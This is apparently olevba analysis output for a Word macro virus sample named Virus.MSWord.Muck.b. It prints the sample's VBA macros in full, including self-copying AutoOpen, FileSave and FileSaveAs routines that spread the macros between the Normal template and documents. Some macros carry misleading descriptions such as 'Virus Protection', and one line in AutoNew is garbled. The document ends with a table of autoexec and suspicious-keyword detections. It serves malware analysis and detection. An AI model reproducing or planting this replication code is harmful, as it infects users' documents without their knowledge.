olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Muck.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Muck.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Muck.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Wazzu Virus Protection.  Used to install the Autoexec macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim ExecuteOnly
On Error Resume Next
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExit", "Global:AutoExit", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSave", "Global:FileSave", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSaveAs", "Global:FileSaveAs", ExecuteOnly


WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", ExecuteOnly
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", ExecuteOnly
WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", ExecuteOnly
WordBasic.MacroCopy "Global:AutoExit", WordBasic.[FileName$]() + ":AutoExit", ExecuteOnly
WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave", ExecuteOnly
WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", ExecuteOnly
WordBasic.FileSaveAll 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Muck.b - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Muck.b - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "When creating a new document this macro shows the IMI toolbar, maximizes the document, and zooms to fit page width."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoNew.MAIN"
Dim IsThereAnIni$
Dim Win$
Dim Platform$
Dim TitleBox$
Dim Copyright$
Dim StartupScreen$
Dim x
Dim Checked
    
Rem MAXIMIZE And SHOW TOOLBAR


UM DRRmemorWordBasic.ViewToolbars Toolbar:="IMI", Show:=1
WordBasic.DocMaximize 1
WordBasic.ViewZoom AutoFit:=1

On Error Resume Next

Rem MAKE INFOMAP.INI If IT DOES Not EXIST
IsThereAnIni$ = WordBasic.[GetPrivateProfileString$]("Word6", "StartupScreen", "InfoMap.ini")

If IsThereAnIni$ = "" Then WordBasic.SetPrivateProfileString "Word6", "StartupScreen", "On", "InfoMap.ini"

Rem DETERMINE PLATFORM For VERSION DISPLAY
Win$ = WordBasic.[GetSystemInfo$](21)

If Win$ = "Windows" Then Platform$ = "Windows" Else Platform$ = "Macintosh"

TitleBox$ = "Version 1.2 for " + Platform$

Copyright$ = "© 1994, Information Mapping, Inc.,  Waltham, MA.  All rights reserved."

Rem SET UP DIALOG BOX
WordBasic.BeginDialog 590, 269, TitleBox$
    WordBasic.Picture 13, 6, 567, 211, "LOGO", 1, "Picture1"
    WordBasic.Text 19, 251, 550, 13, Copyright$, "Text1"
    WordBasic.OKButton 416, 218, 88, 21
    WordBasic.CheckBox 25, 224, 236, 16, "Disable this startup screen.", "CheckBox1"
WordBasic.EndDialog

Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog

WordBasic.CurValues.UserDialog dlg

StartupScreen$ = WordBasic.[GetPrivateProfileString$]("Word6", "StartupScreen", "InfoMap.ini")

If StartupScreen$ = "On" Then x = WordBasic.Dialog.UserDialog(dlg)

Checked = dlg.CheckBox1

If Checked = 1 Then WordBasic.SetPrivateProfileString "Word6", "StartupScreen", "Off", "InfoMap.ini"

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Muck.b - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
Dim ExecuteOnly
On Error Resume Next
WordBasic.FileSave
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", ExecuteOnly
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", ExecuteOnly
WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", ExecuteOnly
WordBasic.MacroCopy "Global:AutoExit", WordBasic.[FileName$]() + ":AutoExit", ExecuteOnly
WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave", ExecuteOnly
WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", ExecuteOnly
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Muck.b - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim ExecuteOnly
On Error Resume Next
WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", ExecuteOnly
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", ExecuteOnly
WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", ExecuteOnly
WordBasic.MacroCopy "Global:AutoExit", WordBasic.[FileName$]() + ":AutoExit", ExecuteOnly
WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave", ExecuteOnly
WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", ExecuteOnly
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
WordBasic.FileSaveAs dlg
WordBasic.FileSaveAs Format:=1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

